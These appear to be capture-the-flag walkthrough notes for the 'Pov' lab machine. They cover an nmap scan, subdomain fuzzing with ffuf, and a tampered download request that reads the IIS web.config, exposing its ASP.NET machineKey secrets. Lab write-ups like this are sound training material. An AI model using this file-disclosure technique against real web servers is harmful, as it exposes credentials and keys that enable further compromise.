# Nmap
```shell
nmap -sC -sV -p- 10.10.11.251            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 09:30 EDT
Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 66.75% done; ETC: 09:32 (0:00:38 remaining)
Nmap scan report for 10.10.11.251
Host is up (0.015s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# DNS Enum
```shell
curl -s -I http://pov.htb -H "HOST: pov.htb" | grep "Content-Length"
Content-Length: 12330


ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://pov.htb -H "Host: FUZZ.pov.htb" -fs 12330
 

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 749ms]



```

## Download CV buttton
Capture the request in burp and then change the download cv.pdf file to \web.config
```xml
HTTP/1.1 200 OK

Cache-Control: private

Content-Type: application/octet-stream

Server: Microsoft-IIS/10.0

Content-Disposition: attachment; filename=\web.config

X-AspNet-Version: 4.0.30319

X-Powered-By: ASP.NET

Date: Wed, 17 Apr 2024 14:38:05 GMT

Connection: close

Content-Length: 866



<configuration>

  <system.web>

    <customErrors mode="On" defaultRedirect="default.aspx" />

    <httpRuntime targetFramework="4.5" />

    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />

  </system.web>

    <system.webServer>

        <httpErrors>

            <remove statusCode="403" subStatusCode="-1" />

            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />

        </httpErrors>

        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />

    </system.webServer>

</configuration>


```
